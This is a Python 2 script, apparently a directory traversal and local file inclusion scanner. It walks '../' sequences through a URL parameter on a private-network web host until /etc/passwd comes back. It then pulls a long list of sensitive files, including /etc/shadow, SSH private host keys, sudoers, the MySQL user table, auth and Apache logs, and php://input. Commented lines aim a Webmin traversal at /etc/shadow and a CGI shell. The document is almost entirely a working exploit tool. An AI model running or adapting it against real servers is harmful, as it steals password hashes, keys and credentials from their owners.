#!/usr/bin/python
import urllib2,time
testers=['etc/passwd','etc/shadow','etc/issue','etc/profile','etc/services','/proc/version','proc/self/environ','var/log/apache2/access.log','var/log/apache/access.log','var/log/httpd/access','var/log/apache2/access_log','var/log/apache/access.log','var/log/apache/access_log','var/log/httpd/access_log','apache/logs/access','apache/logs/access_log','apache2/logs/access','apache2/logs/access_log','etc/httpd/logs/access_log','etc/httpd/logs/access','var/httpd/logs/access_log','var/httpd/logs/access.log','var/httpd/logs/access','var/www/logs/access_log','var/www/logs/access','usr/local/apache/logs/access_log','usr/local/apache/logs/access.log','usr/local/apache/logs/access','usr/local/apache2/logs/access_log','usr/local/apache2/logs/access.log','usr/local/apache2/logs/access','var/log/access_log','var/log/access','logs/access','logs/access_log','logs/access_log','opt/lampp/logs/access_log','opt/lampp/logs/access.log','opt/lampp/logs/access','opt/xampp/logs/access','opt/xampp/logs/access_log','opt/xampp/logs/access.log','var/log/dmesg','var/log/auth','var/log/auth.log','var/log/secure','etc/crontab','etc/cron*','etc/network/interfaces','etc/resolv.conf','etc/sysconfig/network','etc/networks','etc/sudoers','var/apache2/config.inc','var/lib/mysql/mysql/user.MYD','/root/anaconda-ks.cfg','var/mail/root','/var/spool/mail/root','etc/ssh/ssh_config','etc/ssh/sshd_config','etc/ssh/ssh_host_dsa_key.pub','etc/ssh/ssh_host_dsa_key','etc/ssh/ssh_host_rsa_key.pub','etc/ssh/ssh_host_rsa_key','etc/ssh/ssh_host_key.pub','etc/ssh/ssh_host_key','etc/fstab','etc/group','etc/sysconfig/network','etc/at.allow','etc/at.deny','etc/cron.allow','etc/cron.deny','etc/crontab','etc/anacrontab','var/spool/cron/crontabs/root','etc/syslog.conf','etc/chttp.conf','etc/lighttpd.conf','etc/cups/cupsd.conf','etc/inetd.conf','etc/apache2/apache2.conf','etc/my.conf','etc/httpd/conf/httpd.conf','opt/lampp/etc/httpd.conf','php://input']
address = "http://192.168.1.4/index1.php?help=true&connect="    # FOR THE LATEST APPLICATION I TESTED
#address = "http://192.168.1.3:10000/unauthenticated/"+"..%01/"*i+"etc/shadow"    #FOR WEBMIN
#address = "http://192.168.1.3:10000/unauthenticated/"+"..%01/"*i+"usr/lib/cgi-bin/shell.cgi" #FOR WEBMIN
def connect():
    for i in range(0,50,1):
        iterate = "../"*i
        if(i==0):
            iterate = "/"
        url=address+iterate+"etc/passwd"
        print "***** URL= ",url,"\n"
        print "[+][+] ",url
        try:
            res = urllib2.urlopen(url).read()
            if ("/bin/" in res):
                #if ("root" in res):
                #if (":" in res):
                print "\n[+][+] Passwd file found at ",i," iteration\n"
                raw_input("Press Enter...")
                print res
                choice=raw_input("\n[+][+] Do you want to look into other standard files? Press 'y'  ..")
                if(choice=='y' or choice=='Y'):
                    for item in testers:
                        url = address+ iterate + item
                        print url
                        res = urllib2.urlopen(url).read()
                        print res
                        raw_input("\n[+][+]Press enter...\n")
                else:
                    print "You didn't press 'y' or 'Y'. Exiting the script...GoodBye\n"
                    break
        except Exception, err:
            print "Exception occured, continuing.."
        time.sleep(0.5)
        print "[+][+] LOOP NUMBER- ",i
connect()
